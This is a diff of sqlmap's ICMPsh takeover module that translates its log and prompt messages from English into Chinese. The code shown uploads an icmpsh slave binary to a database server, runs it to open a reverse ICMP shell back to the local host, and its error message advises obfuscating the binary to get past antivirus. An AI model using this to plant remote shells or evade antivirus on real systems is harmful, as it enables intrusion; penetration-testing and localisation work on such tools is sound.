@@ -36,10 +36,10 @@ class ICMPsh(object):
 
     def _selectRhost(self):
         address = None
-        message = "what is the back-end DBMS address? "
+        message = "后端 DBMS 的地址是什么？"
 
         if self.remoteIP:
-            message += "[Enter for '%s' (detected)] " % self.remoteIP
+            message += "[按回车键使用默认值 '%s'(检测到的值)] " % self.remoteIP
 
         while not address:
             address = readInput(message, default=self.remoteIP)
@@ -51,10 +51,10 @@ class ICMPsh(object):
 
     def _selectLhost(self):
         address = None
-        message = "what is the local address? "
+        message = "本地地址是什么？"
 
         if self.localIP:
-            message += "[Enter for '%s' (detected)] " % self.localIP
+            message += "[按回车键使用默认值 '%s'(检测到的值)] " % self.localIP
 
         valid = None
         while not valid:
@@ -71,7 +71,7 @@ class ICMPsh(object):
             if conf.batch and not address:
                 raise SqlmapDataException("local host address is missing")
             elif address and not valid:
-                warnMsg = "invalid local host address"
+                warnMsg = "无效的本地主机地址"
                 logger.warning(warnMsg)
 
         return address
@@ -83,13 +83,13 @@ class ICMPsh(object):
         self.rhostStr = ICMPsh._selectRhost(self)
 
     def _runIcmpshMaster(self):
-        infoMsg = "running icmpsh master locally"
+        infoMsg = "在本地运行icmpsh主控端"
         logger.info(infoMsg)
 
         icmpshmaster(self.lhostStr, self.rhostStr)
 
     def _runIcmpshSlaveRemote(self):
-        infoMsg = "running icmpsh slave remotely"
+        infoMsg = "在远程运行icmpsh从属端"
         logger.info(infoMsg)
 
         cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self._icmpslaveRemote, self.lhostStr)
@@ -104,7 +104,7 @@ class ICMPsh(object):
         self._icmpslaveRemote = "%s/%s" % (conf.tmpPath, self._icmpslaveRemoteBase)
         self._icmpslaveRemote = ntToPosixSlashes(normalizePath(self._icmpslaveRemote))
 
-        logger.info("uploading icmpsh slave to '%s'" % self._icmpslaveRemote)
+        logger.info("正在将 icmpsh 从属程序上传到 '%s'" % self._icmpslaveRemote)
 
         if web:
             written = self.webUpload(self._icmpslaveRemote, os.path.split(self._icmpslaveRemote)[0], filepath=self._icmpslave)
@@ -112,18 +112,12 @@ class ICMPsh(object):
             written = self.writeFile(self._icmpslave, self._icmpslaveRemote, "binary", forceCheck=True)
 
         if written is not True:
-            errMsg = "there has been a problem uploading icmpsh, it "
-            errMsg += "looks like the binary file has not been written "
-            errMsg += "on the database underlying file system or an AV has "
-            errMsg += "flagged it as malicious and removed it. In such a case "
-            errMsg += "it is recommended to recompile icmpsh with slight "
-            errMsg += "modification to the source code or pack it with an "
-            errMsg += "obfuscator software"
+            errMsg = "上传icmpsh时出现问题,似乎二进制文件未写入数据库底层文件系统,或者被防病毒软件标记为恶意并删除。在这种情况下,建议对icmpsh进行轻微修改后重新编译源代码,或者使用混淆软件进行打包。"
             logger.error(errMsg)
 
             return False
         else:
-            logger.info("icmpsh successfully uploaded")
+            logger.info("icmpsh 上传成功")
             return True
 
     def icmpPwn(self):
@@ -131,7 +125,7 @@ class ICMPsh(object):
         self._runIcmpshSlaveRemote()
         self._runIcmpshMaster()
 
-        debugMsg = "icmpsh master exited"
+        debugMsg = "icmpsh主控端已退出"
         logger.debug(debugMsg)
 
         time.sleep(1)
